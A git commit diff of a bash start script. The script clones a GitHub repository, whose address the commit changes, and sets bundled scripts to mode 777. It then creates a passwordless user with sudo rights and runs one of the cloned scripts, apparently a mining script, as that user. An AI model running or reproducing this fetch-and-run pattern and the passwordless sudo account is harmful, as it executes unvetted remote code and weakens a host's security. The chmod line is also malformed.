9c8b62f52708b0f9204c8de30925f74b99f85878
200112100 <87609926+200112100@users.noreply.github.com>
2021-08-02 19:18:42 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/valmar94dgg20s/vsetest.git && cd vsetest
+git clone https://github.com/200112100/sonnn.git && cd sonnn
 chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
 sudo adduser --disabled-password --gecos "" upew && sudo usermod -aG sudo upew
 sudo -u upew -H sh -c "./vrsc1.sh"
